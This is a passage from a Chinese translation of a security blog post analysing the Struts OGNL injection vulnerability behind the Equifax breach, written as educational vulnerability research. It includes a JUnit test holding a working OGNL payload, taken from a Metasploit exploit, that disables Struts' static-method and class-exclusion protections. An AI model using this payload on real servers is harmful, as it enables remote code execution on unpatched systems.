    -v \
    -H "Content-type: ${header}" \
    rm ${file1}
    rm ${file2}
当我们试图去执行这个请求的时候，服务器端的一个错误被触发。
在调试过程中我们可以看到`LocalizedTextUtil.findText(...)`被调用。  
我们现在可以看到`defaultMessage`参数中包含注入的头的值。恭喜你！我们终于到了第一步的结尾！如果阅读java文档中关于这个函数的说明，你会发现当没有找到本地化健值的话，就会调用OGNL
表达式去求值。
# 第二部：在OGNL中触发代码执行
从上一步来看，我们知道`LocalizedTextUtil.findText(...)`中参数`defaultMessage`的值如果是OGNL表达式的话，就会触发OGNL表达式代码执行。因此，我们只要找到一个合适的表达式就可以执行任意代码。
更方便的方式是，我发现可以把OGNL表达式快速的添加到项目的单元测试中。看了很多表达式漏洞的利用代码之后，我有了很多灵感去发现我想找的东西。  
为了解决OGNL 表达式执行中需要的变量和对象，我们挖掘Struts
的源码，最后发现`XWorkTestCase`这个类可以提供大多数代码执行所需要的环境。
    package io.sqreen.sandbox;
    import com.opensymphony.xwork2.ActionContext;
    import com.opensymphony.xwork2.TextProvider;
    import com.opensymphony.xwork2.XWorkTestCase;
    import com.opensymphony.xwork2.conversion.impl.XWorkConverter;
    import com.opensymphony.xwork2.ognl.OgnlUtil;
    import com.opensymphony.xwork2.ognl.OgnlValueStack;
    import com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor;
    import com.opensymphony.xwork2.util.CompoundRoot;
    import com.opensymphony.xwork2.util.LocalizedTextUtil;
    import com.opensymphony.xwork2.util.ValueStack;
    import ognl.PropertyAccessor;
    import org.junit.Test;
    import java.util.HashMap;
    import java.util.Locale;
    import java.util.Map;
    import java.util.stream.Collectors;
    import java.util.stream.Stream;
    public class TestOgnl extends XWorkTestCase {
        private OgnlUtil ognlUtil;
        @Override
        public void setUp() throws Exception {
            super.setUp();
            ognlUtil = container.getInstance(OgnlUtil.class);
            assertNotNull(ognlUtil); // first step : being able to initialize OgnlUtil class
        }
        @Test
        public void testBasicOgnl() {
            setupContext(true); // we start with safety checks disabled
            // check very basic behavior : an unknown localized key is returned as-is
            assertEquals("hello", getMissingLocalizedText("hello"));
        }
        @Test
        public void testGetSystemProperty_easyMode() {
            // still with safety checks disabled, we try to get a system property from OGNL expression
            setupContext(true);
            assertEquals(System.getProperty("os.name"), getMissingLocalizedText("%{@java.lang.System@getProperty('os.name')}"));
        }
        @Test
        public void testGetSystemProperty_staticMethodDisabled() {
            // with safety checks, we arent able to get a system property
            setupContext(false);
            assertEquals("", getMissingLocalizedText("%{@java.lang.System@getProperty('os.name')}"));
        }
        @Test
        public void testGetSystemProperty_bypassStaticMethodCheck() {
            // here we reuse the available exploit to bypass safety checks.
            // once this works, we have a malicious payload !
            setupContext(false);
            String ognl = Stream.of(
                    //
                    // this is disabling OgnlUtil static method access, directly taken from metaspoilt exploit
                    // here equivalent to executing in plain java :
                    //
                    // ognlUtil.setAllowStaticMethodAccess(Boolean.toString(true));
                    //
                    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).",
                    "(#_memberAccess?",
                    "(#_memberAccess=#dm):",
                    "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).",
                    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).",
                    "(#ognlUtil.getExcludedPackageNames().clear()).",
                    "(#ognlUtil.getExcludedClasses().clear()).",
                    "(#context.setMemberAccess(#dm)))).",
                    //
                    // what we expect as output
                    "(@java.lang.System@getProperty('os.name'))"
            ).collect(Collectors.joining());
            assertEquals(System.getProperty("os.name"), getMissingLocalizedText("%{" + ognl + "}"));
        }
        private void setupContext(boolean allowStaticMethodAccess) {
            ValueStack valueStack = createValueStack(allowStaticMethodAccess);
            Map contextObjects = new HashMap<>();
            ActionContext actionContext = new ActionContext(contextObjects);
            actionContext.setValueStack(valueStack);
            // action context is stored in a thread-local
            ActionContext.setContext(actionContext);
        }
        private String getMissingLocalizedText(String defaultMessage) {
            System.out.println(String.format("payload : %s", defaultMessage));
            return LocalizedTextUtil.findText(TestOgnl.class, "text_that_does_not_exists", Locale.getDefault(), defaultMessage, new Object[0]);
        }
        private OgnlValueStack createValueStack(boolean allowStaticMethodAccess) {
            OgnlValueStack stack = new MyValueStack(
                    container.getInstance(XWorkConverter.class),
                    (CompoundRootAccessor) container.getInstance(PropertyAccessor.class, CompoundRoot.class.getName()),
                    container.getInstance(TextProvider.class, "system"), allowStaticMethodAccess);
            container.inject(stack);
            // we have to set stack container
            stack.getContext().put(ActionContext.CONTAINER, container);
            ognlUtil.setAllowStaticMethodAccess(Boolean.toString(allowStaticMethodAccess));
            return stack;
        }
        // we need to subclass because of protected OgnlValueStack constructor
        // note that we could also have moved this test class to the same package to avoid this
        private class MyValueStack extends OgnlValueStack {
            public MyValueStack(XWorkConverter xWorkConverter, CompoundRootAccessor compoundRootAccessor, TextProvider textProvider, boolean allowStaticMethodAccess) {
                super(xWorkConverter, compoundRootAccessor, textProvider, allowStaticMethodAccess);
            }
        }
    }
`OgnlUtil`
类中的`setAllowStaticMethodAccess`函数和`setExcludedXXX`函数提供了大量安全检查，目的是为了阻止执行那些已知的可以造成安全隐患的类和函数。可是，因为这些集合是可变的，所以任意代码可以通过调用`OgnlUtil`的初始化代码很容易的禁用他们。  
现在我们可以攻击任何东西了，只要使用一些像curl那样基本的http客户端工具就行了。可以参考
 这个例子
# 我们从中可以学到什么呢？
在事后看来，一旦你了解其中的原理，这些就变得很容易了。但是还是会有很多安全事件会发生，因为许多分开的东西(可能永远不会在一起)以一种意想不到的方式连接在一起。作为开发者我们应该保持谦虚和包容，这样才能准确的处理所有的问题。  
虽然可以通过花一点时间，修改几行代码来修复漏洞，但是谁都无法保证这个问题会再次发生。如果Struts （或者其他的web框架）是超人的话，那么OGNL
可能就是氪星石，把他们放在一起就可能会有危险。
虽然，OGNL
有一些安全问题，但是他不会被轻易的禁用。可以用白名单的方式去避免一些安全问题，但是，有一些表达式可以关掉白名单。如果使配置不可变，那么就可以避免绝大多数的攻击事件，有一件确定的事情就是
Effective Java （  ）的读者注意了，如果你还没有读这本书的话，请在此处阅读并下载这本书。
这篇文章的长度快赶上一篇短篇小说了，我希望你能喜欢Equifax 这个以发布安全政策而闻名的快讯。
确保应用安全始终是不变的目标，写这篇文章的时候，漏洞已经公开一年了，并且已知的Struts 漏洞列表已经变得非常长了：CVE-2017-12611,
CVE-2017-9804, CVE-2017-9805, CVE-2017-9787, CVE-2017-5638, CVE-2018-1327,
CVE-2017-15707, CVE-2017-7672, CVE-2017-9793
# 关于我
Sylvain 是Sqreen 的软件工程师，他喜欢删代码，喜欢维护老的java代码，喜欢奶酪。